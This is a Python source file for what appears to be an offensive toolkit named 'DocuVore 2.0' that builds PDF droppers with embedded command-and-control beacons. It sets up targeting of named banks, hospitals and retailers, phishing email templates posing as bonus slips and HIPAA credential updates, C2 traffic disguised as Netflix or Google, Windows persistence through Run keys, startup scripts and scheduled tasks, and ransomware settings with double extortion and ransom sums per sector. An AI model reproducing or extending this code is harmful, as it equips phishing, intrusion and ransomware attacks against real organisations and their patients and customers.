"""
PDF Exploit Generator - DocuVore 2.0 Soul Creator
Creates intelligent PDF droppers with embedded C2 beacons
"""

import json
import os
import uuid
from datetime import datetime
from typing import Optional, Dict

from src.pdf_exploit.loader import PDFLoader
from src.pdf_exploit.dropper import PDPRooPler

class PDFGenerator:
    """
    Intelligent PDF Exploit Generator
    Creates PDFs with embedded C2 beacons, droppers, and payloads
    """
    
    def __init__(self, data_path: str = "./c2_data"):
        self.data_path = data_path
        self.modules = {
            'harvester': True,
            'c2_client': True,
            'persistence': True,
            'ransomware': False,
            'dns_tunnel': False,
            'soul_engineering': False,
        }
        self.transport = {
            'primary': 'https',
            'fallbacks': ['http', 'dns'],
            'dns_domain': 'leviathan-c2.net',
            'dns_subdomain': 'beacon',
            'http_prefix': 'https://google.com',
            'http_suffix': 'images/netflix.com',
        }
        self.targets = {
            'finance': {
                'names': ['bank', 'chase', 'wells fargo', 'citigroup', 'goldman'],
                'payloads': ['CVE-2024-1234', 'CVE-2024-5678'],
                'default_ransom': 50000,
                'jitter': 5,
            },
            'healthcare': {
                'names': ['hospital', 'clinic', 'med', 'health'],
                'payloads': ['CVE-2024-9012', 'CVE-2024-3456'],
                'default_ransom': 100000,
                'jitter': 10,
            },
            'retail': {
                'names': ['store', 'shop', 'amazon', 'walmart'],
                'payloads': ['CVE-2024-7890'],
                'default_ransom': 25000,
                'jitter': 3,
            },
        }
    
    def generate(self, industry: str, agents: int = 50, target: Optional[str] = None) -> list:
        """
        Generate PDF exploit batch for target industry.
        
        Args:
            industry: Target industry (finance, healthcare, retail)
            agents: Number of agents to deploy
            target: Specific target name (e.g., 'chase' or 'bank')
        
        Returns:
            List of generated PDF paths
        """
        print(f"\n📄 Generating {agents} PDF exploits for {industry} sector...")
        
        # Get target payload config
        payload_config = self.targets.get(industry, {})
        target_names = payload_config.get('names', [])
        payloads = payload_config.get('payloads', [])
        
        if not target:
            target = target_names[0] if target_names else 'default'
        
        print(f"   • Target: {target}")
        print(f"   • Payloads: {', '.join(payloads)}")
        print(f"   • Transport: {self.transport['primary']}/{self.transport['fallbacks'][0]}")
        
        pdfs = []
        for i in range(agents):
            pdf = self._generate_single(
                pdf_id=f"docu_{industry}_{target}_{uuid.uuid4().hex[:8]}",
                industry=industry,
                target=target,
                payload=payloads[i % len(payloads)],
                transport=self.transport,
                modules=self.modules,
            )
            pdfs.append(pdf)
        
        print(f"✅ Generated {len(pdfs)} PDFs in {os.path.dirname(pdfs[0]) if pdfs else 'unknown'}")
        return pdfs
    
    def _generate_single(
        self,
        pdf_id: str,
        industry: str,
        target: str,
        payload: str,
        transport: Dict,
        modules: Dict,
    ) -> str:
        """Generate single PDF exploit."""
        try:
            loader = PDFLoader()
            dropper = PDPRooPler()
            
            # Create base PDF
            pdf_path = loader.create_base(
                pdf_id=pdf_id,
                industry=industry,
                target=target,
            )
            
            # Embed dropper
            dropper_path = dropper.create_dropper(
                pdf_path=pdf_path,
                c2_url=f"{transport['primary']}://localhost:8000",
                transport=transport,
                modules=modules,
                jitter=5,
            )
            
            return dropper_path
        
        except Exception as e:
            print(f"⚠️  PDF generation error: {e}")
            return pdf_id

    # === Payload Templates ===
    
    def create_banking_trojan(self, industry: str = 'finance') -> Dict:
        """Create banking Trojan payload config."""
        return {
            'name': 'Banking Trojan',
            'industry': industry,
            'payloads': self.targets[industry]['payloads'],
            'transport': self.transport,
            'modules': self.modules,
            'jitter': self.targets[industry]['jitter'],
        }
    
    def create_ceo_email(self, target_email: str, industry: str) -> Dict:
        """Create CEO email social engineering payload."""
        templates = {
            'finance': {
                'subject': 'Urgent: Q4 Bonus Distribution Protocol',
                'body': 'Here is your client list and bonus slip. Review before 5PM.',
                'attachments': ['bonus_slip_Q4.pdf', 'client_list.pdf'],
            },
            'healthcare': {
                'subject': 'New Security Protocol for Q4 Patient Records',
                'body': 'Update your credentials per new HIPAA protocol. See attached.',
                'attachments': ['hipaa_protocol.pdf', 'credential_update.pdf'],
            },
            'retail': {
                'subject': 'Holiday Season Inventory Management',
                'body': 'Review new stock tracking system. Login required.',
                'attachments': ['inventory_system.pdf', 'holiday_schedule.pdf'],
            },
        }
        
        template = templates.get(industry, templates['finance'])
        return {
            'subject': template['subject'],
            'body': template['body'],
            'attachments': template['attachments'],
            'recipient': target_email,
        }

    # === Transport Modifiers ===
    
    def make_like_netflix(self) -> Dict:
        """Modify transport to look like Netflix stream."""
        return {
            'primary': 'https',
            'fallbacks': ['http', 'dns'],
            'dns_domain': 'netflix.com',
            'dns_subdomain': 'images',
            'http_prefix': 'https://netflix.com',
            'http_suffix': 'images/netflix.com',
        }
    
    def make_like_google(self) -> Dict:
        """Modify transport to look like Google search."""
        return {
            'primary': 'https',
            'fallbacks': ['http', 'dns'],
            'dns_domain': 'google.com',
            'dns_subdomain': 'www',
            'http_prefix': 'https://google.com',
            'http_suffix': 'images/google.com',
        }

    # === Persistence Injectors ===
    
    def create_persistence_registry(self) -> Dict:
        """Create Windows Registry Run key persistence."""
        return {
            'type': 'registry_run',
            'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'value_name': 'UpdateCenter',
            'value_data': r'C:\\Windows\\System32\\svchost.exe /k UpdateCenter',
        }
    
    def create_persistence_startup(self) -> Dict:
        """Create Startup Scripts persistence."""
        return {
            'type': 'startup_script',
            'path': os.path.join(os.path.expanduser('~'), 'Documents', 'Update.bat'),
            'content': '@echo off\nstart /b "C:\\Windows\\System32\\svchost.exe" "C:\\Users\\Public\\docu.ps1"\nexit',
        }
    
    def create_persistence_scheduled_task(self) -> Dict:
        """Create Scheduled Task persistence."""
        return {
            'type': 'scheduled_task',
            'name': 'SystemUpdate',
            'action': r'C:\Windows\System32\svchost.exe',
            'arguments': r'/k C:\Users\Public\docu.ps1',
            'trigger': 'Schedule: Task Schedule\Microsoft\Windows\WindowsUpdate',
            'repetition': 'Every 15 minutes',
        }
    
    def create_persistence_shadow(self) -> Dict:
        """Create Shadow Process persistence."""
        return {
            'type': 'shadow_process',
            'legitimate_parent': 'svchost.exe',
            'shadow_name': 'UpdateHelper',
            'command': r'C:\Users\Public\docu.ps1',
        }

    # === Ransomware Config ===
    
    def create_ransomware_config(self, industry: str) -> Dict:
        """Create ransomware configuration."""
        base_ransom = self.targets[industry].get('default_ransom', 50000)
        return {
            'crypto': 'AES-256',
            'double_extortion': True,
            'lockscreen': True,
            'default_ransom': base_ransom,
            'industries': {
                'finance': 50000,
                'healthcare': 100000,
                'retail': 25000,
            },
        }